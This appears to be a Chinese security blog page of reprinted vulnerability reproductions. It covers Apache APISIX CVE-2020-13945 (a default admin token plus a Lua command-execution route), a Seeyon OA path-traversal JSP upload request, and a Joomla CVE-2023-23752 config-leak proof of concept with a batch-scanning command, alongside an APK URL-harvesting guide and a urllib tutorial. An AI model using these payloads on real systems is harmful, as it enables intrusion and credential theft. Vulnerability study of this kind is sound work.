+<p>百度：API网关，软件术语，两个相互独立的局域网之间通过路由器进行通信，中间的路由被称之为网关。</p>
+<p>任何一个应用系统如果需要被其他系统调用，就需要暴露 API，这些 API 代表着一个一个的功能点。</p>
+<p>如果两个系统中间通信，在系统之间加上一个中介者协助 API 的调用，这个中介者就是 API 网关。</p>
+<p>那意思就是Apisix是两个系统的一个中介，可以使用这个中间管理系统API。</p>
+</blockquote>
+<h2><span id="存在漏洞">存在漏洞</span></h2><blockquote>
+<p>在用户未指定管理员Token或使用了默认配置文件的情况下，Apache APISIX将使用默认的管理员Token edd1c9f034335f136f87ad84b625c8f1，攻击者利用这个Token可以访问到管理员接口，进而通过script参数来插入任意LUA脚本并执行。</p>
+<p>意思就是有一个默认的Token，可以直接得到管理员权限，并插入攻击脚本。</p>
+</blockquote>
+<h2><span id="漏洞复现">漏洞复现</span></h2><blockquote>
+<p>docker-compose up -d 搭建环境</p>
+<p>docker ps 查看端口为9080</p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/1.png" alt="image"></p>
+<p>访问 127.0.0.1&#x2F;asixpix&#x2F;admin&#x2F;routes,显示token不正确</p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/2.png" alt="image"></p>
+<p>抓这个包，把方法改为POST，加上X-API-KEY: edd1c9f034335f136f87ad84b625c8f1，加上payload</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;uri&quot;: &quot;/attack&quot;,</span><br><span class="line">&quot;script&quot;: &quot;local _M = &#123;&#125; \n function _M.access(conf, ctx) \n local os = require(&#x27;os&#x27;)\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, &#x27;r&#x27;))\n local s = assert(f:read(&#x27;*a&#x27;))\n ngx.say(s)\n f:close()  \n end \nreturn _M&quot;,</span><br><span class="line">    &quot;upstream&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;roundrobin&quot;,</span><br><span class="line">        &quot;nodes&quot;: &#123;</span><br><span class="line">            &quot;example.com:80&quot;: 1</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/3.png" alt="image"></p>
+<p>然后，我们访问刚才添加的router，就可以通过cmd参数执行任意命令：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9080/attack?cmd=id</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/4.png" alt="image"></p>
+</blockquote>
+<h2><span id="payload分析">payload分析</span></h2><blockquote>
+<p>查看官方文档，观察创建路由的方法</p>
+<p><a target="_blank" rel="noopener" href="https://apisix.apache.org/zh/docs/apisix/getting-started/">https://apisix.apache.org/zh/docs/apisix/getting-started/</a></p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/5.png" alt="image"></p>
+<p>与payload对比，发现payload格式与官方创建路由一致，只是利用script插入了一段lua恶意脚本。</p>
+<p>在 Apache APISIX 中，我们在 Route 实体中新增了 script 执行逻辑，可用于接收 Dashboard 生成的 Lua 函数并执行，它支持调用已有插件以复用代码。另外，它也作用于 HTTP 请求的生命周期中的各个阶段，如 access、header_filer、body_filter 等，系统会在相应阶段自动执行 script 函数对应阶段代码<br><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/6.png" alt="image"></p>
+<p>接下来对lua脚本进行分析,\n是换行</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> _M = &#123;&#125; \n <span class="function"><span class="keyword">function</span> <span class="title">_M.access</span><span class="params">(conf, ctx)</span></span>//在access阶段进行处理，检查如果达到的不健康次数超过了配置的最大次数，则就被<span class="keyword">break</span>掉。这里没找到看得懂的资料。</span><br><span class="line"><span class="keyword">local</span> <span class="built_in">os</span> = <span class="built_in">require</span>(<span class="string">&#x27;os&#x27;</span>)//加载<span class="built_in">os</span>模块，用于进行文件操作</span><br><span class="line"><span class="keyword">local</span> args = <span class="built_in">assert</span>(ngx.req.get_uri_args()) //<span class="built_in">assert</span>()是断言，类似于try(),这里是获取uri中给的参数。</span><br><span class="line"><span class="keyword">local</span> f = <span class="built_in">assert</span>(<span class="built_in">io</span>.<span class="built_in">popen</span>(args.cmd, <span class="string">&#x27;r&#x27;</span>))//<span class="built_in">io</span>.<span class="built_in">popen</span>()用于执行系统命令,<span class="string">&#x27;r&#x27;</span>是模式</span><br><span class="line"><span class="keyword">local</span> s = <span class="built_in">assert</span>(f:<span class="built_in">read</span>(<span class="string">&#x27;*a&#x27;</span>))//读取全部内容</span><br><span class="line">ngx.say(s)//输出，还有一种方法是ngx.<span class="built_in">print</span>(),但两者有区别</span><br><span class="line">f:<span class="built_in">close</span>()</span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"><span class="keyword">return</span> _M</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>function _M.access(conf, ctx)</strong></p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/7.png" alt="image"></p>
+<p><strong>assert()</strong></p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/8.png" alt="image"></p>
+<p><strong>read(‘a’)</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u013625451/article/details/78879739">https://blog.csdn.net/u013625451/article/details/78879739</a></p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/9.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/11/08/urllib-HTTPResponse/">
+                urllib库进行网络请求后返回的HTTPResponse对象的用法总结
+            </a>
+        </h2>
+    
+    <time>
+        Nov 8, 2023
+    </time>
+    <section class="content">
+        <h1><span id="urllib库进行网络请求后返回的httpresponse对象的用法总结">urllib库进行网络请求后返回的HTTPResponse对象的用法总结</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/topleeyap/article/details/78845946">「已注销」</a> 并作补充</p>
+</blockquote>
+<blockquote>
+<p>不管是使用urllib.request.urlopen()方法，还是使用opener.open()方法，都返回同样类型的HTTPResponse对象，用法总结如下:</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> response</span><br><span class="line"> </span><br><span class="line">URL=<span class="string">&quot;http://www.baidu.com/&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 构造请求头信息</span></span><br><span class="line"><span class="comment"># 反反爬虫:设置User-Agent</span></span><br><span class="line">request_headers=&#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 构造请求对象,并添加请求头</span></span><br><span class="line">req=request.Request(URL,headers=request_headers)</span><br><span class="line"><span class="comment"># 发起请求</span></span><br><span class="line">resp=request.urlopen(req)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(resp))   <span class="comment"># &lt;class &#x27;http.client.HTTPResponse&#x27;&gt;</span></span><br><span class="line"><span class="comment"># 获取HTTP协议版本号(10 for HTTP/1.0, 11 for HTTP/1.1)</span></span><br><span class="line"><span class="built_in">print</span>(resp.version)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取响应码</span></span><br><span class="line"><span class="built_in">print</span>(resp.status)</span><br><span class="line"><span class="built_in">print</span>(resp.getcode())</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取响应描述字符串</span></span><br><span class="line"><span class="built_in">print</span>(resp.reason)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取实际请求的页面url(防止重定向用)</span></span><br><span class="line"><span class="built_in">print</span>(resp.geturl())</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取特定响应头信息</span></span><br><span class="line"><span class="built_in">print</span>(resp.getheader(name=<span class="string">&quot;Content-Type&quot;</span>))</span><br><span class="line"><span class="comment"># 获取响应头信息,返回二元元组列表</span></span><br><span class="line"><span class="built_in">print</span>(resp.getheaders())</span><br><span class="line"><span class="comment"># 获取响应头信息,返回字符串</span></span><br><span class="line"><span class="built_in">print</span>(resp.info())</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 读取响应体</span></span><br><span class="line"><span class="built_in">print</span>(resp.readline().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(resp.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/HTTP/" rel="tag">HTTP</a><a class="tag-none-link" href="/tags/Python/" rel="tag">Python</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/11/08/Apktool-URL/">
+                提取APK中的URL地址
+            </a>
+        </h2>
+    
+    <time>
+        Nov 8, 2023
+    </time>
+    <section class="content">
+        <h1><span id="提取apk中的url地址">提取APK中的URL地址</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/Aaron_Miller/article/details/108759583">風月长情</a> 并作补充</p>
+</blockquote>
+<h2><span id="一-目的">一、目的</span></h2><blockquote>
+<p>客户端渗透测试前期信息收集过程中可以在APK中检索开发过程中没有删掉的URL地址，在这些地址中可能会发现后台、搜索引擎、子域名查找不到的一些资源。</p>
+</blockquote>
+<h2><span id="二-操作">二、操作</span></h2><blockquote>
+<p>反编译APK文件<br><code>apktool d &lt;xxx.apk&gt;</code><br>将反编译的文件zip打包发送到linux系统中<br><img src="/2023/11/08/Apktool-URL/1.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>使用grep命令进行URL正则匹配<br>通过grep正则匹配包下边所有文件的uri地址，然后排序，删除重复行，最后重定向到文件中<br><code>grep -ohr -E &quot;https?://[a-zA-Z0-9\.\/_&amp;=@$%?~#-]*&quot; /Kevin/com.sogou.map.android.maps/ |sort|uniq &gt;&gt; test.txt</code><br><img src="/2023/11/08/Apktool-URL/2.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>然后在搜索出来的地址中查看是否有敏感地址：<br>比如这个地址就不在我搜索的上千个子域中：<br><img src="/2023/11/08/Apktool-URL/3.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>随便一试直接进入后台，到此文件上传拿shell一个高危漏洞又到手了，香吧~<br><img src="/2023/11/08/Apktool-URL/4.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apktool/" rel="tag">Apktool</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/11/08/Upload-Seeyon/">
+                致远OA wpsAssistServlet 任意文件上传漏洞 漏洞复现
+            </a>
+        </h2>
+    
+    <time>
+        Nov 8, 2023
+    </time>
+    <section class="content">
+        <h1><span id="致远oa-wpsassistservlet-任意文件上传漏洞-漏洞复现">致远OA wpsAssistServlet 任意文件上传漏洞 漏洞复现</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq2539879928/article/details/127811791">Vista、</a> 并作补充</p>
+</blockquote>
+<h2><span id="01-漏洞描述">01 漏洞描述</span></h2><blockquote>
+<p>致远OA是一套办公协同管理软件。致远OA wpsAssistServlet接口存在任意文件上传漏洞，攻击者通过漏洞可以发送特定的请求包上传恶意文件，获取服务器权限。</p>
+</blockquote>
+<h2><span id="02-影响范围">02 影响范围</span></h2><blockquote>
+<p>致远OA A6、A8、A8N (V8.0SP2，V8.1，V8.1SP1)<br>致远OA G6、G6N (V8.1、V8.1SP1)</p>
+</blockquote>
+<h2><span id="03-利用方式">03 利用方式</span></h2><blockquote>
+<p>1、调用文件上传接口上传测试文件，请求包如下：</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/seeyon/wpsAssistServlet?flag=save&amp;realFileType=../../../../ApacheJetspeed/webapps/ROOT/test.jsp&amp;fileId=2</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>349</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--59229605f98b8cf290a7b8908b34616b</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;upload&quot;; filename=&quot;test.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: application/vnd.ms-excel</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">&lt;% <span class="keyword">out</span>.println(&quot;seeyon_vuln&quot;);%&gt;</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--59229605f98b8cf290a7b8908b34616b--</span></span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>2、文件上传成功时，响应情况如下图所示：<br><img src="/2023/11/08/Upload-Seeyon/1.png" alt="image"> </p>
+</blockquote>
+<blockquote>
+<p>3、访问上传文件:<a target="_blank" rel="noopener" href="http://xx.xx.xx.xx/test.jsp,%E5%8F%91%E7%8E%B0%E8%AF%A5%E6%96%87%E4%BB%B6%E6%88%90%E5%8A%9F%E8%A2%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E3%80%82">http://xx.xx.xx.xx/test.jsp,发现该文件成功被服务器解析。</a><br><img src="/2023/11/08/Upload-Seeyon/2.png" alt="image"><br><img src="/2023/11/08/Upload-Seeyon/3.png" alt="image"></p>
+</blockquote>
+<h2><span id="04-修复方案">04 修复方案</span></h2><blockquote>
+<p>1、对路径 &#x2F;seeyon&#x2F;htmlofficeservlet 进行限制访问。<br>2、致远官方已发布补丁，请联系官方安装相应补丁。</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Seeyon/" rel="tag">Seeyon</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/11/08/CVE-2023-23752-Joomla/">
+                CVE-2023-23752 POC Joomla! 未授权访问漏洞
+            </a>
+        </h2>
+    
+    <time>
+        Nov 8, 2023
+    </time>
+    <section class="content">
+        <h1><span id="cve-2023-23752-poc-joomla-未授权访问漏洞">CVE-2023-23752 POC Joomla! 未授权访问漏洞</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.ddosi.org/cve-2023-23752/">雨苁</a> 并作补充</p>
+</blockquote>
+<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
+<p>在 Joomla! 版本为4.0.0 到 4.2.7中发现了一个漏洞,可以对 web 服务端点进行未经授权访问。</p>
+</blockquote>
+<h2><span id="漏洞详情">漏洞详情</span></h2><blockquote>
+<p>项目： Joomla！<br>子项目： CMS<br>影响：严重<br>严重性： 高<br>概率：高<br>版本： 4.0.0-4.2.7<br>利用类型：不正确的访问控制<br>报告日期： 2023-02-13<br>修复日期： 2023-02-16<br>CVE 编号： CVE​​-2023-23752</p>
+</blockquote>
+<h2><span id="描述">描述</span></h2><blockquote>
+<p>不正确的访问检查允许对 web 服务端点进行未经授权的访问。</p>
+</blockquote>
+<h2><span id="受影响的版本">受影响的版本</span></h2><blockquote>
+<p>Joomla! CMS 版本 4.0.0-4.2.7</p>
+</blockquote>
+<h2><span id="解决方案">解决方案</span></h2><blockquote>
+<p>升级到版本 4.2.8</p>
+</blockquote>
+<h2><span id="joomla安全中心公告">Joomla!安全中心公告</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://developer.joomla.org/security-centre">https://developer.joomla.org/security-centre</a><br><img src="/2023/11/08/CVE-2023-23752-Joomla/1.png" alt="image"> </p>
+</blockquote>
+<h2><span id="poc">POC</span></h2><blockquote>
+<p><code>/api/index.php/v1/config/application?public=true</code></p>
+</blockquote>
+<h3><span id="批量测试">批量测试</span></h3><blockquote>
+<p><code>httpx -l ip.txt -path &#39;/api/index.php/v1/config/application?public=true&#39;</code></p>
+</blockquote>
+<h2><span id="测试效果">测试效果</span></h2><blockquote>
+<p><img src="/2023/11/08/CVE-2023-23752-Joomla/2.png" alt="image"></p>
+</blockquote>
+<h2><span id="漏洞分析">漏洞分析</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12175">https://xz.aliyun.com/t/12175</a><br>Joomla(CVE-2023-23752)——一个请求参数 打穿Rest API<br>由于公司对漏洞的要求比较高，代码审计很快集中到了请求路由的代码块。不管是Wordpress&#x2F;RounderCube还是PhpMyAdmin以及一些知名度比较高的php应用（一个Java安全研究员感到头皮发麻），我的重点对象变成了请求路由的代码追踪，一旦分析经过路由选择之后，剩下的业务代码我是完全不看了。虽然有点不专业，但是这是挖掘未授权漏洞最好的道路，最终终于找到了一个不错的高危漏洞——Joomla未授权访问Rest API。</p>
+</blockquote>
+<h2><span id="受影响版本">受影响版本</span></h2><blockquote>
+<p>Joomla大致有三个路由入口，分别是：<br>根目录的index.php(用户访问文章)<br>根目录的administrator&#x2F;index.php(管理员管理)<br>根目录的api&#x2F;index.php(开发者爱好的Rest API)<br>未授权的接口正是第三个入口。因此影响的只有Joomla4.0.0——Joomla4.2.7（Rest API 4.x正式开发）</p>
+</blockquote>
+<h2><span id="分析">分析</span></h2><blockquote>
+<p>这里仅重点分析api&#x2F;index.php这个路由的问题（index.php和administrator&#x2F;index.php找不到漏洞）。<br>网站输入&#x2F;api&#x2F;index.php开启debug模式<br><img src="/2023/11/08/CVE-2023-23752-Joomla/3.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>index.php会来到app.php。其中$app主要的input成员存放所有的HTTP请求参数<br><img src="/2023/11/08/CVE-2023-23752-Joomla/4.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>在execute()函数中，会经过sanityCheckSystemVariables函数，此函数用来过滤渲染模板的参数，主要防止XSS漏洞。setupLogging和createExtensionNameSpaceMap主要是系统的额外记录工作。doExecute就是具体的路由逻辑函数。<br><img src="/2023/11/08/CVE-2023-23752-Joomla/5.png" alt="image"><br>doExecute中最重要的就是route和dispatch函数。</p>
+</blockquote>
+<h2><span id="route路由选择与鉴权">route：路由选择与鉴权</span></h2><blockquote>
+<p>整个route函数分为两部分，路由选择和身份校验。<br><img src="/2023/11/08/CVE-2023-23752-Joomla/6.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>逻辑十分清晰，主要是直接通过parseApiRoute函数从请求的方法和url到$routers中找到对应的路由信息<br><img src="/2023/11/08/CVE-2023-23752-Joomla/7.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>身份验证的代码加上debug信息可以知道public参数控制着API是否对外开放。默认情况下是false，不对外开放。但是这里大部分情况都会选择直接下一步。但是回过头看路由获取parseApiRoute时会有新的发现<br><img src="/2023/11/08/CVE-2023-23752-Joomla/8.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>这里发送请求<br><code>http://x.x.x.x/api/index.php/v1/banners?public=true</code><br>再来看route变量会发现惊喜<br><img src="/2023/11/08/CVE-2023-23752-Joomla/9.png" alt="image"><br>此时route.var中的变量会被请求的变量覆盖。由于public&#x3D;true，所以接口不需要身份验证，直接到达路由分发，也就是业务逻辑。</p>
+</blockquote>
+<h2><span id="受损的api清单">受损的API清单</span></h2><blockquote>
+<p>由于能够直接访问API了，从中找到最终的信息即可。<br><code>/api/index.php/v1/config/application?public=true</code><br>此API用于获取网站最重要的配置信息，其中包含数据库的账号与密码。<br>其他受损API如下</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br></pre></td><td class="code"><pre><span class="line">v1/banners</span><br><span class="line">v1/banners/:id</span><br><span class="line">v1/banners</span><br><span class="line">v1/banners/:id</span><br><span class="line">v1/banners/:id</span><br><span class="line">v1/banners/clients</span><br><span class="line">v1/banners/clients/:id</span><br><span class="line">v1/banners/clients</span><br><span class="line">v1/banners/clients/:id</span><br><span class="line">v1/banners/clients/:id</span><br><span class="line">v1/banners/categories</span><br><span class="line">v1/banners/categories/:id</span><br><span class="line">v1/banners/categories</span><br><span class="line">v1/banners/categories/:id</span><br><span class="line">v1/banners/categories/:id</span><br><span class="line">v1/banners/:id/contenthistory</span><br><span class="line">v1/banners/:id/contenthistory/keep</span><br><span class="line">v1/banners/:id/contenthistory</span><br><span class="line">v1/config/application</span><br><span class="line">v1/config/application</span><br><span class="line">v1/config/:component_name</span><br><span class="line">v1/config/:component_name</span><br><span class="line">v1/contacts/form/:id</span><br><span class="line">v1/contacts</span><br><span class="line">v1/contacts/:id</span><br><span class="line">v1/contacts</span><br><span class="line">v1/contacts/:id</span><br><span class="line">v1/contacts/:id</span><br><span class="line">v1/contacts/categories</span><br><span class="line">v1/contacts/categories/:id</span><br><span class="line">v1/contacts/categories</span><br><span class="line">v1/contacts/categories/:id</span><br><span class="line">v1/contacts/categories/:id</span><br><span class="line">v1/fields/contacts/contact</span><br><span 